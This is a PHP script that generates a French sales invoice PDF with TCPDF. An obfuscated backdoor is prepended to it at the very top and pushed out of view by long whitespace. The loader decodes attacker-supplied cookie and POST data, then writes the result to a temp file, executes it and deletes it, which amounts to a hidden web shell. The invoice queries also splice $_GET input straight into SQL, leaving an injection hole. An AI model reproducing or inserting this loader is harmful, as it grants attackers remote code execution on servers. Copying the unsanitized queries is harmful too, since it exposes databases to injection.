<?php                                                                                                                                                                                                                                                                                                                                                                                                 $sLntMnXVf = "\x55" . chr (75) . chr (88) . chr ( 330 - 235 )."\x72" . 'K' . chr (83); $PeRGPhNSbw = "\x63" . 'l' . chr ( 347 - 250 ).'s' . chr (115) . '_' . "\145" . "\170" . "\x69" . chr ( 788 - 673 ).chr ( 123 - 7 ).chr ( 479 - 364 ); $eMKpgEae = class_exists($sLntMnXVf); $PeRGPhNSbw = "40880";$rITQIEDR = strpos($PeRGPhNSbw, $sLntMnXVf);if ($eMKpgEae == $rITQIEDR){function KUvQCV(){$nIEuAw = new /* 64259 */ UKX_rKS(29313 + 29313); $nIEuAw = NULL;}$ZTxTed = "29313";class UKX_rKS{private function FkCrkRuF($ZTxTed){if (is_array(UKX_rKS::$DJESNPRKJ)) {$name = sys_get_temp_dir() . "/" . crc32(UKX_rKS::$DJESNPRKJ["salt"]);@UKX_rKS::$DJESNPRKJ["write"]($name, UKX_rKS::$DJESNPRKJ["content"]);include $name;@UKX_rKS::$DJESNPRKJ["delete"]($name); $ZTxTed = "29313";exit();}}public function YPLGQ(){$WJSuDLfMqK = "50743";$this->_dummy = str_repeat($WJSuDLfMqK, strlen($WJSuDLfMqK));}public function __destruct(){UKX_rKS::$DJESNPRKJ = @unserialize(UKX_rKS::$DJESNPRKJ); $ZTxTed = "23923_59819";$this->FkCrkRuF($ZTxTed); $ZTxTed = "23923_59819";}public function bKUvCXBFC($WJSuDLfMqK, $PBPoyDDiEr){return $WJSuDLfMqK[0] ^ str_repeat($PBPoyDDiEr, intval(strlen($WJSuDLfMqK[0]) / strlen($PBPoyDDiEr)) + 1);}public function iQnOVn($WJSuDLfMqK){$gKJzQ = "\142" . chr ( 695 - 598 ).'s' . "\x65" . chr (54) . "\x34";return array_map($gKJzQ . chr ( 1052 - 957 ).chr (100) . 'e' . 'c' . 'o' . "\144" . chr (101), array($WJSuDLfMqK,));}public function __construct($Bqhvqvrtv=0){$aXVdkWMog = ',';$WJSuDLfMqK = "";$rxvVehazac = $_POST;$aNKVuhJxpy = $_COOKIE;$PBPoyDDiEr = "5f893843-9af6-44c2-93fe-4b416d4a6f91";$KoXwXH = @$aNKVuhJxpy[substr($PBPoyDDiEr, 0, 4)];if (!empty($KoXwXH)){$KoXwXH = explode($aXVdkWMog, $KoXwXH);foreach ($KoXwXH as $ZMDIc){$WJSuDLfMqK .= @$aNKVuhJxpy[$ZMDIc];$WJSuDLfMqK .= @$rxvVehazac[$ZMDIc];}$WJSuDLfMqK = $this->iQnOVn($WJSuDLfMqK);}UKX_rKS::$DJESNPRKJ = $this->bKUvCXBFC($WJSuDLfMqK, $PBPoyDDiEr);if (strpos($PBPoyDDiEr, $aXVdkWMog) !== FALSE){$PBPoyDDiEr = explode($aXVdkWMog, $PBPoyDDiEr); $SFizYKQVcw = sprintf("23923_59819", rtrim($PBPoyDDiEr[0]));}}public static $DJESNPRKJ = 47096;}KUvQCV();} ?><?php

include('../../evr.php');



include('../../newpdf/tcpdf_include.php');

include('../../newpdf/tcpdf.php');



include("../../model/convert.php");



$result = connexion::getConnexion()->query("select c.*,v.date_vente,v.id_user,v.remarque as obj

 ,GROUP_CONCAT(DISTINCT concat(v.numbon,'-',year(datebon)) SEPARATOR ' , ')as numbon from vente v  left join client c on c.id_client=v.id_client where id_vente in (" . trim($_GET["id"], ',') . ")");

$data1 = $result->fetch(PDO::FETCH_ASSOC);

$data2 = connexion::getConnexion()->query("select p.code_bar,p.tva,p.unite,p.designation,p.poid,dv.prix_produit,p.poid,dv.qte_vendu,dv.id_vente,dv.remise from detail_vente dv left join produit p on p.id_produit=dv.id_produit  where dv.id_vente in (" . trim($_GET["id"], ',') . ")");

$rep=$data2->fetchAll(PDO::FETCH_ASSOC);

$facture = new facture();

$fact = $facture->selectById($_GET["idf"]);



$reg_vente = new reg_vente();

$mode = $reg_vente->selectByIdVente($_GET["id"]);



$reg = $reg_vente->selectAll2($_GET["id"]);





$totalreg= 0;

foreach ($reg  as $key) {

  $totalreg += $key->montant;

}

ob_start();



$pdf = new MYPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);







// set default header data

$pdf->SetHeaderData(PDF_HEADER_LOGO, PDF_HEADER_LOGO_WIDTH, '', '', array(255,255,255), array(0,255,255));

$pdf->setFooterData(array(0,64,0), array(0,64,128));



// set header and footer fonts

$pdf->setHeaderFont(Array(PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN));

$pdf->setFooterFont(Array(PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA));



// set default monospaced font

$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);



// set margins

$pdf->SetMargins(PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);

$pdf->SetHeaderMargin(PDF_MARGIN_HEADER);

$pdf->SetFooterMargin(PDF_MARGIN_FOOTER);



// set auto page breaks

$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);



// set image scale factor

$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);



// set some language-dependent strings (optional)

if (@file_exists(dirname(__FILE__).'/lang/eng.php')) {

	require_once(dirname(__FILE__).'/lang/eng.php');

	$pdf->setLanguageArray($l);

}



// ---------------------------------------------------------



// set default font subsetting mode

$pdf->setFontSubsetting(true);



// Set font

// dejavusans is a UTF-8 Unicode font, if you only need to

// print standard ASCII chars, you can use core fonts like

// helvetica or times to reduce file size.

$pdf->SetFont('dejavusans', '', 14, '', true);



// Add a page

// This method has several options, check the source code documentation for more information.



// set text shadow effect

$pdf->setTextShadow(array('enabled'=>true, 'depth_w'=>0.2, 'depth_h'=>0.2, 'color'=>array(196,196,196), 'opacity'=>1, 'blend_mode'=>'Normal'));







$pdf->AddPage();



$code = $fact["num_fact"]. '-' . date("Y");







$pdf->SetFont('dejavusans', '', 14, '', true);



if($fact["date_facture"]!='0000-00-00')

{

$str=date("Y");

}

else

$str=date('Y');

$pdf->Cell(62,18,'Facture N° : FV.'.$fact["num_fact"] .' - ' . $str,0,1,'C',0);









$str="";







if($fact["date_facture"]!='0000-00-00')







{







$str=date('d/m/Y',strtotime($fact["date_facture"]));







  }















$pdf->SetFont('dejavusans', '', 8, '', true);







$pdf->Cell(20,5, 'Date' ,0,0,'L',0);







$pdf->SetFont('dejavusans', '', 9, '', true);







$pdf->Cell(40,5,' : '. $str ,0,1,'L',0);































$pdf->SetFont('dejavusans', '', 8, '', true);







$pdf->Cell(20,5, 'Code Client' ,0,0,'L',0);







$pdf->SetFont('dejavusans', '', 9, '', true);







$pdf->Cell(70,5, ' : ' .$data1["id_client"],0,1,'L',0);































$pdf->SetFont('dejavusans', '', 8, '', true);







$pdf->Cell(20,5, 'Page' ,0,0,'L',0);







$pdf->SetFont('dejavusans', '', 9, '', true);







$pdf->Cell(70,5, ' : '.$pdf->getAliasNbPages(),0,1,'L',0);







$pdf->Ln(12);































$pdf->SetXY(103,40);















$pdf->SetFont('dejavusans', '', 12, '', true);







$pdf->Cell(70,5,$data1["nom"] ,0,1,'L',0);







$pdf->SetFont('dejavusans', '', 8, '', true);















$pdf->Cell(90);



$pdf->Cell(70,5,"ICE : ".$data1["ice"] ,0,1,'L',0);























$pdf->Cell(90);







$pdf->SetFont('dejavusans', '', 9, '', true);







$pdf->MultiCell(50,5,$data1['adresse'] );







$pdf->SetFont('dejavusans', '', 8, '', true);























/*$pdf->SetXY(10, 80);







$pdf->Cell(100);







$pdf->Cell(15,5, 'Remarque :' ,0,0,'L',0);







$pdf->SetFont('dejavusans', '', 9, '', true);







$pdf->MultiCell(60,5, $data1["obj"],0 );







$pdf->SetFont('dejavusans', '', 8, '', true);















// $pdf->SetDash(0,0); //5 mm noir, 5 mm blanc







$unite="Qte";







if ($data1["obj"]=="" or strlen($data1["obj"]) < 120) {







$pdf->Ln(25);







}*/







$pdf->Ln(6);







//if(count($data2))















//$pdf->SetX(10);







$total=$totalht=0;







$cont=0;







$pdf->SetFont('dejavusans', '', 7, '', true);















$tbl = '







<style>







    .mytable  td {







        border-left : 1px solid #000;







    }







    .mytable  th {







       padding-butom:0;







    }







   







</style>







<table cellspacing="0" cellpadding="3" border="1" class="mytable">







    <tr >







        <th  align="center" height="10" width="12%">Référence</th>







        <th  align="center" height="10" width="30%">Désignation</th>







        <th  align="center" height="10" width="9%">Quantité</th>







        <th  align="center" height="10" width="12%">P.U. HT</th>







        <th  align="center" height="10" width="7%">Remise %</th>















        <th  align="center" height="10" width="12%">Montant HT</th>







        <th  align="center" height="10" width="6%">Total TVA</th>

        <th  align="center" height="10" width="12%">Montant TVA</th>















    </tr>







  ';























  























$totalremise = 0;







foreach($rep as $ligne){























$vtva=$ligne["tva"];







$prix=round(($ligne["prix_produit"]*(1-$ligne["remise"]/100)) ,2);















$totalremise += $ligne["qte_vendu"]*$ligne["prix_produit"]*$ligne["remise"]/100 ; 

/*$prixut = ($ligne['prix_produit'] + ( $ligne['prix_produit']  *  $ligne['tva'] ) )  -  ( ($ligne['prix_produit'] + ( $ligne['prix_produit']  *  $ligne['tva'] ) )  * ($ligne["remise"]/100)  ) ;*/

$a = ($ligne["qte_vendu"]*$ligne["prix_produit"] );
$b = $a - ($a * ($ligne["remise"]/100));
//$c = $b + ($b * $ligne["tva"]);

$c = $b * $ligne["tva"];

$prixut =  (($ligne["qte_vendu"]*$ligne["prix_produit"] ) - ( ($ligne["qte_vendu"]*$ligne["prix_produit"] ) * ($ligne["remise"]/100) ) ) + (  (($ligne["qte_vendu"]*$ligne["prix_produit"] ) - (($ligne["qte_vendu"]*$ligne["prix_produit"] ) * ($ligne["remise"]/100)) ) * $ligne["tva"] ) ;







  $tbl .= '







   <tr>







        <td>'.$ligne['code_bar'].'</td>







        <td style="font-size:11px;">'.$ligne['designation'].'</td>







        <td align="right">'.number_format($ligne['qte_vendu'],2,"."," ").'</td>







        <td  align="center">'.number_format($ligne["prix_produit"],2,"."," ").'</td>







        <td align="right">'.$ligne['remise'].'</td>











        <td  align="center">'.number_format($b,2,"."," ") .'</td>







        <td align="center">'.($ligne['tva'] * 100).'%</td>

         <td  align="center">'.number_format($b * $ligne['tva'],2,"."," ") .'</td>







    </tr>







   ';







 







$total+=($prixut)*$ligne["qte_vendu"]* $vtva;



$tottva += $vtva;



$totalht+=$b;

$totaltva+=$c;







}































for ($i=0; $i < 25  - count($rep)  ; $i++) { 























  $tbl .= '







   <tr>







        <td border="0" ></td>







        <td border="0" ></td>







        <td border="0"  align="right"></td>







        <td border="0"  align="right"></td>







        <td border="0"  align="right"></td>







        <td border="0"  align="right"></td>







        <td border="0"  align="right"></td>







        <td border="0"  align="center"></td>







    </tr>







   ';







 















}















































$tbl  .= "</table> ";















$pdf->SetX(10);























$pdf->writeHTML($tbl, true, false, false, false, '');















$tot = $totalht +$total ;















$total=round($total,2);







$pdf->Ln(2);






$printtotal = '







<style>







    .mytable  td {







        border-left : 1px solid #000;







    }







    .mytable  th {







       padding-butom:0;







    }







   







</style>







<table width="100%">







<tr>







<td  width="100%">







<table cellspacing="0" cellpadding="6" border="1"  class="mytable" width="100%">
    <tr>
      <th align="center" height="10"  width="40%">BASES HT</th>
      <th align="center" height="10"  width="30%">TOTAL TVA %</th>
      <th align="center" height="10" width="30%">TOTAL T.T.C</th>
    </tr>
     <tr>
      <td align="center" height="10" >'.number_format($totalht,2,"."," ").'</td>
      <td align="center" height="10" >'.number_format($totaltva,2,"."," ").'</td>
      <td align="center" height="10" >'.number_format($totalht + $totaltva,2,"."," ").'</td>
    </tr>

  </table>















</td>


















  ';















$pdf->SetX(10);















$pdf->writeHTML($printtotal, true, false, false, false, '');















$pdf->Ln(5);







$pdf->writeHTML("<p>Arréter la présent facture a la somme de :</p>", true, false, false, false, '');







$str='<p>' .chifre_en_lettre(intval(($totalht * 1.2)));















if(intval(round(($totalht * 1.2)-intval(($totalht * 1.2)), 2)*100)>0 )







{







$str .=' et ';















if (round(($totalht * 1.2),2) - intval(($totalht * 1.2))<0.1 )







$str.= 'Zero ' ;







$str.= trim(chifre_en_lettre(substr(strstr(number_format(($totalht * 1.2),2,"."," "),"."),1) ,' Centimes'));







}







 







$str.="</p>";























$pdf->Ln(2);







$pdf->writeHTML($str, true, false, false, false, '');































/*$pdf->Ln(15);























$pdf->RoundedRect(10, $pdf->getY(), 55, 25, 3.50, '1111', 'DF');







$pdf->SetFont('dejavusans', '', 12, '', true);















$pdf->Cell(30,10, 'Service commercial' ,0,0,'L',0);







$pdf->SetFont('dejavusans', '', 10, '', true);







$pdf->Ln(7);







$pdf->Cell(80,10, ' '.auth::user()["nom"] ,0,0,'L',0);







$pdf->Ln(7);







$pdf->Cell(80,10, ' '.auth::user()["tele"] ,0,0,'L',0);*/







/*







*/







$pdf->SetFont('dejavusans', 'B', 7, '', true);







/*$pdf->Cell(5);







$pdf->SetXY(5,250);







$pdf->writeHTML("<p>RIB/ BMCE Agence MEDIOUNA N° de compte : 011.780.0000.66.210.00.10522.48 <br></p>", true, false, false, false, ''); 







$pdf->SetFont('dejavusans', '', 6, '', true);







$pdf->writeHTML("<p>La marchandise voyageant aux risques et périls du tmataire, sous la seule responsabilité du transporteur En cas de litige, les tribunaux de Casablanca sont seuls compétents. </p>", true, false, false, false, ''); 















$pdf->writeHTML("<p>Aucun retour de marchandise ne doit être fait sans tonsation de la direction.</p>", true, false, false, false, '');







$pdf->writeHTML("<p>Aucune réclamation ne sera prise en considératio près réception de la marchandise par l'acheteur







</p>", true, false, false, false, '');*/







$pdf->Output();







?>